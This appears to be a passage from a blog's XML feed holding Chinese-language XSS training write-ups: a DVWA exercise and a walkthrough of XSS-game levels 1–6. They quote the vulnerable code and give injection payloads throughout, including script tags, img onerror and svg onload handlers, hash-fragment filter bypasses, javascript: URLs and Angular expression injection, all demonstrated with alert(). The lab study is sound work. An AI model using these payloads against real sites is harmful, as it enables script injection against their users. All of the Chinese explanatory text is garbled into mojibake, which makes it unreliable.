&apos;index.php&apos; ); // Get input $message = trim( $_POST[ &apos;mtxMessage&apos; ] ); $name = trim( $_POST[ &apos;txtName&apos; ] ); // Sanitize message input $message = stripslashes( $message ); $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $message = htmlspecialchars( $message ); // Sanitize name input $name = stripslashes( $name ); $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $name = htmlspecialchars( $name ); // Update database $data = $db-&gt;prepare( &apos;INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );&apos; ); $data-&gt;bindParam( &apos;:message&apos;, $message, PDO::PARAM_STR ); $data-&gt;bindParam( &apos;:name&apos;, $name, PDO::PARAM_STR ); $data-&gt;execute(); } // Generate Anti-CSRF token generateSessionToken(); ?&gt; åˆ†æžæ­¤å¤„å°†messageå’Œnameä¸¤ä¸ªå‚æ•°å…¨éƒ¨è¿›è¡Œäº†htmlå®žä½“åŒ–ï¼Œä¸”ç»‘å®šäº†å˜é‡å°†sqlè¯­å¥é¢„å¤„ç† Vulnerability: DOM Based Cross Site Scripting (XSS)Lowåœ¨æœåŠ¡ç«¯æ²¡æœ‰ä»£ç ï¼Œå®¢æˆ·ç«¯çš„æºä»£ç  &lt;form name=&quot;XSS&quot; method=&quot;GET&quot;&gt; &lt;select name=&quot;default&quot;&gt; &lt;script&gt; if (document.location.href.indexOf(&quot;default=&quot;) &gt;= 0) { var lang = document.location.href.substring(document.location.href.indexOf(&quot;default=&quot;)+8); document.write(&quot;&lt;option value=&apos;&quot; + lang + &quot;&apos;&gt;&quot; + decodeURI(lang) + &quot;&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&apos;&apos; disabled=&apos;disabled&apos;&gt;----&lt;/option&gt;&quot;); } document.write(&quot;&lt;option value=&apos;English&apos;&gt;English&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&apos;French&apos;&gt;French&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&apos;Spanish&apos;&gt;Spanish&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&apos;German&apos;&gt;German&lt;/option&gt;&quot;); &lt;/script&gt; &lt;/select&gt; &lt;input type=&quot;submit&quot; value=&quot;Select&quot; /&gt; &lt;/form&gt; åˆ†æžåœ¨scriptè„šæœ¬é‡Œï¼Œé€šè¿‡documentæ“ä½œåŽå°†defaultåŽé¢çš„å‚æ•°å€¼ç›´æŽ¥èµ‹å€¼ç»™äº†langï¼Œç»è¿‡urlè§£ç åŽå°†å…¶å€¼èµ‹ç»™optionæ ‡ç­¾çš„valueå±žæ€§èŠ‚ç‚¹å’Œæ–‡æœ¬èŠ‚ç‚¹ç›´æŽ¥æ˜¾ç¤ºå‡ºæ¥ï¼Œ ç›´æŽ¥å°†defaultåŽé¢çš„å‚æ•°å€¼æ”¹ä¸ºteståŽå¯ä»¥çœ‹åˆ°æ˜¾ç¤ºäº†test Payload&lt;script&gt;alert(/xss-dom/)&lt;/script&gt; Medium&lt;form name=&quot;XSS&quot; method=&quot;GET&quot;&gt; &lt;select name=&quot;default&quot;&gt; &lt;script&gt; if (document.location.href.indexOf(&quot;default=&quot;) &gt;= 0) { var lang = document.location.href.substring(document.location.href.indexOf(&quot;default=&quot;)+8); document.write(&quot;&lt;option value=&apos;&quot; + lang + &quot;&apos;&gt;&quot; + decodeURI(lang) + &quot;&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&apos;&apos; disabled=&apos;disabled&apos;&gt;----&lt;/option&gt;&quot;); } document.write(&quot;&lt;option value=&apos;English&apos;&gt;English&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&apos;French&apos;&gt;French&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&apos;Spanish&apos;&gt;Spanish&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&apos;German&apos;&gt;German&lt;/option&gt;&quot;); &lt;/script&gt; &lt;/select&gt; &lt;input type=&quot;submit&quot; value=&quot;Select&quot; /&gt; &lt;/form&gt; stripos() å‡½æ•°æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºçŽ°çš„ä½ç½®ï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰,è¿™é‡Œè¿‡æ»¤äº†&lt;scriptæ ‡ç­¾ä¸”å¤§å°å½¢å¼äº†è¿‡æ»¤äº† Payloadæ–¹å¼1urlä¸­æœ‰ä¸€ä¸ªå­—ç¬¦ä¸º#ï¼Œè¯¥å­—ç¬¦åŽçš„æ•°æ®ä¸ä¼šå‘é€åˆ°æœåŠ¡å™¨ç«¯ï¼Œä»Žè€Œç»•è¿‡æœåŠ¡ç«¯è¿‡æ»¤ ?#default=&lt;script&gt;alert(/dom-xss-test-medium/)&lt;/script&gt; æ–¹æ³•2æˆ–è€…å°±æ˜¯ç”¨imgæ ‡ç­¾æˆ–å…¶ä»–æ ‡ç­¾çš„ç‰¹æ€§åŽ»æ‰§è¡Œjsä»£ç ï¼Œæ¯”å¦‚imgæ ‡ç­¾çš„onerroräº‹ä»¶ï¼Œæž„é€ é“¾æŽ¥ï¼Œè¦æ³¨æ„é—­åˆ imgæ ‡ç­¾onerroräº‹ä»¶åŠ è½½ document.write(&quot;&lt;option value=&apos;&quot; + lang + &quot;&apos;&gt;&quot; + decodeURI(lang) + &quot;&lt;/option&gt;&quot;); &lt;/option&gt;&lt;/select&gt;&lt;option&gt;&lt;img src=# onerror=&quot;alert(&quot;xss&quot;)&quot;&gt; åŒæ ·çš„æ ‡ç­¾è¿˜æœ‰svgï¼Œsvgçš„onloadäº‹ä»¶åŒæ ·å¯ä»¥åœ¨é¡µé¢åŠ è½½æ—¶æ‰§è¡Œjsä»£ç ï¼Œäº§ç”Ÿå¼¹æ¡†çš„æ•ˆæžœ &lt;/option&gt;&lt;/select&gt;&lt;option&gt;&lt;svg onload=&quot;alert(&quot;xss&quot;)&quot;&gt; HighVulnerability Source&lt;?php // Is there any input? if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &apos;default&apos; ]) ) { # White list the allowable languages switch ($_GET[&apos;default&apos;]) { case &quot;French&quot;: case &quot;English&quot;: case &quot;German&quot;: case &quot;Spanish&quot;: # ok break; default: header (&quot;location: ?default=English&quot;); exit; } } ?&gt; åˆ†æžæœåŠ¡ç«¯ä½¿ç”¨äº†caseè¯­å¥è¿›è¡Œåˆ¤æ–­ï¼Œä¸èƒ½å†é€šè¿‡å…¶ä»–JavaScriptäº‹ä»¶æ¥ç»•è¿‡äº†è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨ # æ¥è·³è¿‡æœåŠ¡ç«¯æ£€æŸ¥ Payload#?default=&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt; éªŒè¯æˆåŠŸ ImpossibleVulnerability Source&lt;?php # Don&apos;t need to do anything, protction handled on the client side ?&gt; å‚è€ƒé€šè¿‡DVWAå­¦ä¹ XSS ç»•è¿‡DVWAæ‰€æœ‰å®‰å…¨çº§åˆ«çš„XSS Payload]]></content>
      <tags>
        <tag>DVWA</tag>
        <tag>practice</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Wargame-XSS-game]]></title>
    <url>%2F2018%2F07%2F04%2FWargame-XSS-game%2F</url>
    <content type="text"><![CDATA[Wargame-XSS-gamehttp://www.xssgame.com/ Level 1:Hello,world of XSSæç¤ºéƒ¨åˆ†ä»»åŠ¡æè¿° æ­¤çº§åˆ«æ¼”ç¤ºäº†è·¨ç«™ç‚¹è„šæœ¬çš„å¸¸è§åŽŸå› ï¼Œå…¶ä¸­ç”¨æˆ·è¾“å…¥ç›´æŽ¥åŒ…å«åœ¨é¡µé¢ä¸­è€Œæ²¡æœ‰æ­£ç¡®è½¬ä¹‰ã€‚ ä¸Žä¸‹é¢çš„æ˜“å—æ”»å‡»çš„åº”ç”¨ç¨‹åºçª—å£äº¤äº’ï¼Œæ‰¾åˆ°ä¸€ç§æ–¹æ³•ä½¿å…¶æ‰§è¡Œæ‚¨é€‰æ‹©çš„JavaScriptã€‚æ‚¨å¯ä»¥åœ¨æ˜“å—æ”»å‡»çš„çª—å£å†…æ‰§è¡Œæ“ä½œæˆ–ç›´æŽ¥ç¼–è¾‘å…¶URLæ ã€‚ ä½¿å‘½ç›®æ ‡ æ³¨å…¥è„šæœ¬ä»¥alert()åœ¨ä¸‹é¢çš„æ¡†æž¶ä¸­å¼¹å‡ºJavaScript ã€‚ ä¸€æ—¦æ˜¾ç¤ºè­¦æŠ¥ï¼Œæ‚¨å°±å¯ä»¥è¿›å…¥ä¸‹ä¸€çº§åˆ«ã€‚ä½ çš„ç›®æ ‡ æµ‹è¯•åœ¨è¾“å…¥æ¡†ä¸­éšä¾¿è¾“å…¥ test åŽå¾—åˆ° https://xss-game.appspot.com/level1/frame?query=test URLå˜åŒ– é¡µé¢é‡æ–°åŠ è½½ æµ‹è¯•çš„å­—ç¬¦å†…å®¹è¢«ä¸€èµ·åŠ è½½åˆ°é¡µé¢ä¸­ å…¶ä¸­URLç»“å°¾çš„?query= åŽé¢çš„å†…å®¹ä¸Žæˆ‘ä»¬è¾“å…¥çš„æ˜¯ä¸€è‡´çš„ï¼ˆè¾“å…¥è¾“å‡ºç›¸åŒï¼‰ payload&lt;script&gt;alert(&quot;test&quot;)&lt;/script&gt; æ‰§è¡ŒæˆåŠŸ https://xss-game.appspot.com/level1/frame?query=&lt;script&gt;alert(&quot;test&quot;)&lt;/script&gt; Level 2:Persistence is key(æŒä¹…æ€§æ˜¯å…³é”®)æ—¶é—´åˆ°äº†ï¼ç”¨æˆ·æä¾›çš„æ¯ä¸€é¡¹æ•°æ®éƒ½å¿…é¡»æ­£ç¡®è½¬ä¹‰ï¼Œä»¥æ˜¾ç¤ºå®ƒæ‰€åœ¨é¡µé¢çš„ä¸Šä¸‹æ–‡ã€‚è¿™ä¸ªçº§åˆ«è¯´æ˜Žäº†åŽŸå› ã€‚ è¾“å…¥ä¸€ä¸ªè¾“å…¥ï¼Œä½¿åº”ç”¨ç¨‹åºåœ¨JavaScriptä¸­æ‰§è¡Œalertï¼ˆï¼‰å‡½æ•°ã€‚ åˆ†æžå…³é”®éƒ¨åˆ†ä»£ç &lt;html&gt; &lt;head&gt; &lt;script src=&quot;/static/js/js_frame.js&quot;&gt;&lt;/script&gt; &lt;script&gt; function startTimer(seconds) { seconds = parseInt(seconds) || 3; setTimeout(function() { window.confirm(&quot;Time is up!&quot;); window.loading.style.display = &apos;none&apos;; window.message.innerHTML = &apos;&lt;a href=&quot;?&quot;&gt;Go back&lt;/a&gt; to the timer setup page&apos;; }, seconds * 1000); } &lt;/script&gt; &lt;/head&gt; &lt;body style=&quot;background-color: white;&quot;&gt; &lt;center&gt; &lt;h1 style=&quot;font-family: serif&quot;&gt; webtim&lt;span style=&quot;color: teal&quot;&gt;r&lt;/span&gt; &lt;span style=&quot;color: green&quot;&gt;pro&lt;/span&gt; &lt;/h1&gt; &lt;!-- Source: https://commons.wikimedia.org/wiki/File:Loading_icon.gif --&gt; &lt;img id=&quot;loading&quot; src=&quot;/static/img/loading.gif&quot; style=&quot;width: 50%&quot; onload=&quot;startTimer(&apos;3&apos;);&quot; /&gt; &lt;br&gt; &lt;div id=&quot;message&quot;&gt;Your timer will execute in 3 seconds.&lt;/div&gt; &lt;/center&gt; &lt;/body&gt; &lt;/html&gt; å…³é”®éƒ¨åˆ†æ˜¯å‡½æ•°StartTimer() å’Œ &lt;img id=&quot;loading&quot; src=&quot;/static/img/loading.gif&quot; style=&quot;width: 50%&quot; onload=&quot;startTimer(&apos;3&apos;);&quot; /&gt; çŸ¥è¯†ç‚¹&lt;script&gt; var a = &apos;a&apos; + alert(); // æˆ–è€… &apos;-&apos; ä¹Ÿå¯ä»¥ï¼Œé‡ç‚¹åœ¨äºŽè®© alert() å‚ä¸Žè¿ç®— // å½“ alert() å‚ä¸Žè¿ç®—çš„æ—¶å€™ // js ä¼šå°è¯•è®© alert() å…ˆæ‰§è¡Œ // ç„¶åŽå–å…¶æ‰§è¡ŒåŽçš„è¿”å›žå€¼å†å‚ä¸Žå‰é¢çš„è¿ç®— &lt;/script&gt; å†ç»“åˆ img æ ‡ç­¾çš„ onload äº‹ä»¶ï¼šonload = &quot;startTime(&apos;?&apos;)&quot;; // è¿™é‡Œéœ€è¦æŠŠä¸Šé¢çš„çŸ¥è¯†ç‚¹åˆ©ç”¨ä¸Š ä¹Ÿå°±æ˜¯æŠŠ alert() ä»¥åˆé€‚çš„ä½ç½®æ’å…¥ // å…ˆå°è¯•ç›´æŽ¥æ’å…¥alert() onload = &quot;startTimer(&apos;alert()&apos;)&quot;; // startTimer(&apos;alert()&apos;); â€¦â€¦ è¿™ä¸ç›´æŽ¥å½“å­—ç¬¦ä¸²ä¼ è¿‡åŽ»äº†å—â€¦â€¦ ä¸è¡Œ // çœ‹çœ‹ä¸Šé¢çš„çŸ¥è¯†ç‚¹â€¦â€¦ // æ’å…¥ a&apos;+alert()+&apos;a onload = &quot;startTimer(&apos;a&apos;+alert()+&apos;a&apos;)&quot;; // è¿™åº”è¯¥å·®ä¸å¤šäº†â€¦â€¦ å¯æ˜¯å¥½åƒaæ²¡å•¥ç”¨å•Šï¼Œä¸ä¼ ä¸ä¹Ÿè¿˜æ˜¯å­—ç¬¦ä¸²å—ï¼Œåªä¸è¿‡æ˜¯ç©ºå­—ç¬¦ä¸² // æ’å…¥ &apos;+alert()+&apos; onload = &quot;startTimer(&apos;&apos;+alert()+&apos;&apos;)&quot;; payloadï¼š&apos;+alert(&quot;xss&quot;)+&apos; http://www.xssgame.com/f/WrfpuKFX8GNr/?timer=&apos;+alert(&quot;xss&quot;)+&apos; Level 3 ç”»å»Šå¤æ‚çš„Webåº”ç”¨ç¨‹åºé€šå¸¸ä¼šåœ¨JavaScriptä¸­ç”Ÿæˆéƒ¨åˆ†UIã€‚ä¸€äº›å¸¸è§çš„JSå‡½æ•°æ˜¯æ‰§è¡ŒæŽ¥æ”¶å™¨ï¼Œè¿™æ„å‘³ç€å®ƒä»¬å°†å¯¼è‡´æµè§ˆå™¨æ‰§è¡Œå…¶è¾“å…¥ä¸­å‡ºçŽ°çš„ä»»ä½•è„šæœ¬ã€‚ è¿™ä¸ªçº§åˆ«çš„åº”ç”¨ç¨‹åºæ­£åœ¨ä½¿ç”¨ä¸€ä¸ªè¿™æ ·çš„æŽ¥æ”¶å™¨ã€‚ ç”±äºŽæ‚¨æ— æ³•åœ¨åº”ç”¨ç¨‹åºçš„ä»»ä½•ä½ç½®è¾“å…¥æœ‰æ•ˆè´Ÿè½½ï¼Œå› æ­¤æ‚¨å¿…é¡»åœ¨æä¾›çš„URLæ ä¸­æ‰‹åŠ¨ç¼–è¾‘åœ°å€ã€‚ç›®æ ‡æ˜¯åˆ©ç”¨åº”ç”¨ç¨‹åºä¸­çš„æ¼æ´žä½¿å…¶æ‰§è¡ŒJavaScript alertï¼ˆï¼‰å‡½æ•°ã€‚ æµ‹è¯•éšæ‰‹è¾“å…¥å‚æ•°éžæ³•çš„å‚æ•°-1ï¼Œå¯ä»¥çœ‹åˆ°é¡µé¢å›žæ˜¾äº† -1 æºç &lt;html&gt; &lt;head&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/level_style.css&quot; /&gt; &lt;script src=&quot;/static/js/jquery2.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;/static/js/js_frame.js&quot;&gt;&lt;/script&gt; &lt;script&gt; window.onvalidationready = null; function validate() { $.post(location.pathname, {&apos;h&apos;: location.hash}, function(data, status) { $(&apos;#result&apos;).html(data); if (window.onvalidationready) { window.onvalidationready(); window.onvalidationready = null; } }); } function chooseTab(name) { var html = &quot;Cat &quot; + parseInt(name) + &quot;&lt;br&gt;&quot;; html += &quot;&lt;img src=&apos;/static/img/cat&quot; + name + &quot;.jpg&apos; /&gt;&quot;; document.getElementById(&apos;tabContent&apos;).innerHTML = html; // Select the current tab var tabs = document.querySelectorAll(&apos;.tab&apos;); for (var i = 0; i &lt; tabs.length; i++) { if (tabs[i].id == &quot;tab&quot; + parseInt(name)) { tabs[i].className = &quot;tab active&quot;; } else { tabs[i].className = &quot;tab&quot;; } } window.location.hash = name; // Tell parent we&apos;ve changed the tab top.postMessage({&apos;url&apos;: self.location.toString()}, &quot;*&quot;); } function hashchange() { if (self.location.hash) { chooseTab(self.location.hash.substr(1)); validate(); } else { chooseTab(1); } } window.onload = hashchange; window.onhashchange = hashchange; &lt;/script&gt; &lt;/head&gt; &lt;body id=&quot;dom-demo&quot;&gt; &lt;div id=&quot;result&quot;&gt;&lt;/div&gt; &lt;div id=&quot;header&quot;&gt; &lt;span&gt;Cat Image&lt;/span&gt; &lt;span&gt;X&lt;/span&gt;&lt;span&gt;S&lt;/span&gt;&lt;span&gt;S&lt;/span&gt; Library &lt;/div&gt; &lt;!-- Source: https://www.flickr.com/photos/eraphernalia_vintage/2988746750 CC BY-SA 2.0 https://creativecommons.org/licenses/by-sa/2.0/ Created by Cheryl, published here without modifications --&gt; &lt;div class=&quot;tab&quot; id=&quot;tab1&quot; onclick=&quot;chooseTab(&apos;1&apos;)&quot;&gt;Cat 1&lt;/div&gt; &lt;!-- Source: https://pixabay.com/en/cat-red-christmas-santa-hat-funny-1898512/ (License: Public Domain) --&gt; &lt;div class=&quot;tab&quot; id=&quot;tab2&quot; onclick=&quot;chooseTab(&apos;2&apos;)&quot;&gt;Cat 2&lt;/div&gt; &lt;!-- Source: https://pixabay.com/en/cat-kitten-cute-funny-whiskers-1686730/ (License: Public Domain) --&gt; &lt;div class=&quot;tab&quot; id=&quot;tab3&quot; onclick=&quot;chooseTab(&apos;3&apos;)&quot;&gt;Cat 3&lt;/div&gt; &lt;div id=&quot;tabContent&quot;&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; å…³é”®éƒ¨åˆ†è¿™é‡Œè¿›è¡Œäº†æ–‡ä»¶åçš„æ‹¼æŽ¥ éœ€è¦æ³¨æ„çš„æ˜¯é€šè¿‡ innerHTML å†™åˆ° div ä¸­ã€‚è€Œ innerHTML æ–¹æ³•ç›´æŽ¥å†™å…¥çš„ â€¦ å¹¶ä¸ä¼šè¢«æ‰§è¡Œã€‚ img src=&apos;&apos; onerror=&apos;alert()&apos; /&gt; &lt;!-- å½“å›¾ç‰‡åŠ è½½é”™è¯¯çš„æ—¶å€™ï¼Œå°±ä¼šæ‰§è¡Œ onerror ä¸­çš„ alert() æ–¹æ³• å¯¹äºŽæœ¬å…³ æˆ‘ä»¬åªéœ€è¦è®©ä»–è®¿é—®ä¸€ä¸ªä¸å­˜åœ¨çš„å›¾ç‰‡å¹¶è®©å…¶æ‰§è¡Œ onerror=&apos;alert()&apos; å°±OKäº† --&gt; payload8&apos;onerror=&apos;alert(/xss/)&apos; http://www.xssgame.com/f/u0hrDTsXmyVJ/#8&apos;onerror=&apos;alert(/xss/)&apos; ç”¨å•å¼•å·æˆªæ–­1,ä½¿å…¶ scr æŒ‡å‘â€™1â€™è¿™ä¸ªæ–‡ä»¶ï¼Œå¹¶åŠ å…¥ onerror äº‹ä»¶ï¼Œè€Œå› ä¸ºâ€™1â€™è¿™ä¸ªæ–‡ä»¶ä¸å­˜åœ¨ï¼ŒåŠ è½½é”™è¯¯ï¼Œè½¬è€Œæ‰§è¡Œ onerror ä¸­çš„ alert() æ–¹æ³•ã€‚ Level 4 è°·æ­Œè¯»è€…è·¨ç«™ç‚¹è„šæœ¬ä¸ä»…ä»…æ˜¯æ­£ç¡®è½¬ä¹‰æ•°æ®ã€‚æœ‰æ—¶ï¼Œå³ä½¿æ²¡æœ‰å°†æ–°å…ƒç´ æ³¨å…¥DOMï¼Œæ”»å‡»è€…ä¹Ÿå¯ä»¥åšåäº‹ã€‚ ç›®æ ‡æ˜¯å†æ¬¡åˆ©ç”¨åº”ç”¨ç¨‹åºä¸­çš„æ¼æ´žä½¿å…¶æ‰§è¡ŒJavaScript alertï¼ˆï¼‰å‡½æ•°ã€‚é‡è¦çš„æ˜¯è§£å†³æ–¹æ¡ˆä¸åº”è¯¥è¦æ±‚ç”¨æˆ·äº¤äº’ - æ‰“å¼€URLåº”è¯¥è¶³ä»¥è§¦å‘è­¦æŠ¥ã€‚å¦è¯·æ³¨æ„ï¼Œalertï¼ˆï¼‰åº”å¼¹å‡ºæŒ‘æˆ˜åŸŸ - é‡å®šå‘åˆ°æ‚¨è‡ªå·±çš„ç½‘é¡µï¼Œå¹¶æé†’é‚£é‡Œä¸ä¼šè¢«è§†ä¸ºæœ‰æ•ˆçš„è§£å†³æ–¹æ¡ˆã€‚ æµ‹è¯•Sign up &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/level_style.css&quot; /&gt; &lt;script src=&quot;/static/js/js_frame.js&quot;&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;center&gt; &lt;img src=&quot;/static/img/googlereader-logo.png&quot; /&gt;&lt;br&gt;&lt;br&gt; &lt;!-- We&apos;re ignoring the email, but the poor user will never know! --&gt; Enter email: &lt;input id=&quot;reader-email&quot; name=&quot;email&quot; value=&quot;&quot;&gt; &lt;br&gt;&lt;br&gt; &lt;a href=&quot;confirm?next=welcome&quot;&gt;Next &gt;&gt;&lt;/a&gt; &lt;/center&gt; &lt;/body&gt; &lt;/html&gt; &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/level_style.css&quot; /&gt; &lt;script src=&quot;/static/js/js_frame.js&quot;&gt;&lt;/script&gt; &lt;/head&gt; &lt;body style=&quot;background-color: white;&quot;&gt; &lt;center&gt; Welcome! Today we are announcing the much anticipated&lt;br&gt; &lt;img src=&quot;/static/img/googlereader.png&quot; /&gt;&lt;br&gt; &lt;a href=&quot;signup?next=confirm&quot;&gt;Sign up&lt;/a&gt; for an exclusive Beta. &lt;/center&gt; &lt;/body&gt; &lt;/html&gt; www.xssgame.com/f/__58a1wgqGgI/confirm?next=welcome &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;script src=&quot;/static/js/js_frame.js&quot;&gt;&lt;/script&gt; &lt;/head&gt; &lt;body style=&quot;background-color: white;&quot;&gt; &lt;center&gt; &lt;img src=&quot;/static/img/googlereader-logo.png&quot; /&gt;&lt;br&gt;&lt;br&gt; Thanks for signing up, you will be redirected soon... &lt;script&gt; setTimeout(function() { window.location = &apos;welcome&apos;; }, 1000); &lt;/script&gt; &lt;/center&gt; &lt;/body&gt; &lt;/html&gt; å…¶ä¸­çš„â€™Welcomeâ€™åƒæ˜¯æˆ‘ä»¬ URL ä¸­ä¼ å…¥çš„å‚æ•°ã€‚ç»ä¼ å…¥å…¶ä»–å‚æ•°æµ‹è¯•ï¼Œå‘çŽ° window.location = æˆ‘ä»¬ä¼ å…¥çš„å‚æ•°ã€‚ çŸ¥è¯†ç‚¹window.location = &apos;welcome&apos;; /* è¿™æ˜¯ä¸€ä¸ªé¡µé¢é‡å®šå‘çš„æ“ä½œ window.location ç­‰åŒäºŽ window.location.href è€Œ DOM çš„ href å±žæ€§å‘¢ï¼Œæ”¯æŒè¿™æ ·å†™ï¼š &lt;a href=&apos;javascript:alert()&apos; &gt; &lt;/a&gt; */ payload:confirm?next=javascript:alert() http://www.xssgame.com/f/__58a1wgqGgI/confirm?next=javascript:alert() Level 5 è§’Angularæ˜¯ä¸€ä¸ªéžå¸¸æµè¡Œçš„æ¡†æž¶ï¼Œåœ¨å®‰å…¨åœ°å¼€å‘åº”ç”¨ç¨‹åºæ—¶æœ‰ä¸€å¥—è‡ªå·±çš„è§„åˆ™ã€‚å…¶ä¸­ä¹‹ä¸€æ˜¯åœ¨Angularçš„æ¨¡æ¿ç³»ç»Ÿè¿è¡Œä¹‹å‰ä¿®æ”¹DOMæ—¶åº”è¯¥å°å¿ƒã€‚ è¿™ä¸€æŒ‘æˆ˜è¯´æ˜Žäº†ä¸ºä»€ä¹ˆè¿™å¾ˆé‡è¦ã€‚ ç›®æ ‡æ˜¯å†æ¬¡åˆ©ç”¨åº”ç”¨ç¨‹åºä¸­çš„æ¼æ´žä½¿å…¶æ‰§è¡ŒJavaScript alertï¼ˆï¼‰å‡½æ•°ã€‚ ä»£ç åˆ†æž&lt;script&gt; angular.module(&apos;myApp&apos;, []) .controller(&apos;myController&apos;, [&apos;$scope&apos;, function ($scope) { $scope.query = &quot;&quot;; $scope.alert = window.alert; }]); var UTM_PARAMS = [&quot;utm_content&quot;, &quot;utm_medium&quot;, &quot;utm_source&quot;, &quot;utm_campaign&quot;, &quot;utm_term&quot;] if (location.search) { var params = location.search.substring(1).split(&apos;&amp;&apos;); for (var p in params) { var r = params[p].split(&apos;=&apos;); if (r.length == 2 &amp;&amp; UTM_PARAMS.indexOf(r[0]) != -1) { var el = document.getElementsByName(r[0]); if (el.length) el[0].value = decodeURIComponent(r[1]); } } } &lt;/script&gt; å…ˆå®šä¹‰äº†ä¸€ä¸ªæ•°ç»„ï¼Œç”¨æ¥è¿‡æ»¤ URL ä¸­çš„å‚æ•°ã€‚è¿‡æ»¤å‡ºå‚æ•°ä»¥åŽå‘¢ï¼ŒåŽ»é¡µé¢ä¸Šæ‰¾ç›¸åº”çš„èŠ‚ç‚¹ã€‚å¹¶ç»™èŠ‚ç‚¹èµ‹å€¼ã€‚é¡µé¢ä¸­çš„èŠ‚ç‚¹æœ‰è¿™å‡ ä¸ªï¼š &lt;form action=&quot;&quot; method=&quot;POST&quot;&gt; &lt;input id=&quot;demo2-query&quot; name=&quot;query&quot; maxlength=&quot;140&quot; ng-model=&quot;query&quot; placeholder=&quot;Enter query here...&quot;&gt; &lt;input name=&quot;utm_term&quot; type=&quot;hidden&quot;&gt; &lt;input name=&quot;utm_campaign&quot; type=&quot;hidden&quot; value=&quot;cpc&quot;&gt; &lt;input id=&quot;demo2-button&quot; type=&quot;submit&quot; value=&quot;Search&quot;&gt; &lt;/form&gt; å¯ä»¥çœ‹åˆ°utm_term è¾“å…¥æ¡†å±žæ€§æ˜¯hidden çŸ¥è¯†ç‚¹ä»€ä¹ˆæ˜¯ Angularä¸€æ¬¾éžå¸¸ä¼˜ç§€çš„å‰ç«¯é«˜çº§ JS æ¡†æž¶ å…¶æ ¸å¿ƒå°±æ˜¯é€šè¿‡æŒ‡ä»¤æ‰©å±•äº† HTMLï¼Œé€šè¿‡è¡¨è¾¾å¼ç»‘å®šæ•°æ®åˆ° HTMLã€‚ Angularä¸æŽ¨å´‡DOMæ“ä½œï¼Œä¹Ÿå°±æ˜¯è¯´åœ¨NGä¸­å‡ ä¹Žæ‰¾ä¸åˆ°ä»»ä½•çš„DOMæ“ä½œ åœ¨Angularä¸­æ€Žä¹ˆä½¿ç”¨alert() Angular è¡¨è¾¾å¼{{}}è¡¨ç¤ºä¸€ä¸ªè¡¨è¾¾å¼ï¼Œåƒæ¨¡æ¿å¼•æ“Ž hello:{{user.name}} {{â€œhello:â€+user.name}} {{1+1}} {{[1,2,3,4]}} payloadé€‰æ‹©ä¸€ä¸ªèŠ‚ç‚¹è¿›è¡Œèµ‹å€¼ ?utm_term={{alert()}} http://www.xssgame.com/f/JFTG_t7t3N-P/?utm_term={{alert()}} Less 6 è§’2ç»å¸¸å¯¼è‡´Angularè¡¨è¾¾å¼æ³¨å…¥çš„ç¼–ç¨‹æ¨¡å¼æ˜¯ä½¿ç”¨æœåŠ¡å™¨ç«¯æ¨¡æ¿ç³»ç»Ÿæ¥ç”ŸæˆAngularç”¨ä½œå…¶è‡ªå·±çš„æ¨¡æ¿çš„HTMLã€‚å³ä½¿æœåŠ¡å™¨ç«¯æ¨¡æ¿ä¿è¯è¾“å‡ºä¸­æ²¡æœ‰â€œæ™®é€šâ€XSSï¼Œä¹Ÿæ˜¯å¦‚æ­¤ã€‚ ç›®æ ‡æ˜¯å†æ¬¡åˆ©ç”¨åº”ç”¨ç¨‹åºä¸­çš„æ¼æ´žä½¿å…¶æ‰§è¡ŒJavaScript alertï¼ˆï¼‰å‡½æ•°ã€‚ æµ‹è¯•è¾“å…¥test,ä¼šå‘çŽ°è¾“å…¥çš„å†…å®¹ä¸Žè¾“å‡ºçš„ä¸€è‡´ï¼Œå°è¯•æž„é€ alert()è¿›è¡Œæµ‹è¯•ï¼Œä½†æ˜¯æ˜¾ç¤ºå¤±è´¥ï¼Œè¿™æ˜¯å› ä¸º ng-non-bindableæŒ‡ä»¤ä¼šå‘Šè¯‰AngularJSå½“å‰çš„HTMLå…ƒç´ æˆ–å…¶å­å…ƒç´ ä¸éœ€è¦ç¼–è¯‘ è¿™é‡Œç‰ˆæœ¬æ˜¯1.2.0ï¼Œæ˜¯ä¸€ä¸ªå¾ˆæ—©çš„ç‰ˆæœ¬&lt;script src=&quot;//ajax.googleapis.com/ajax/libs/angularjs/1.2.0/angular.min.js&quot;&gt;&lt;/script&gt; 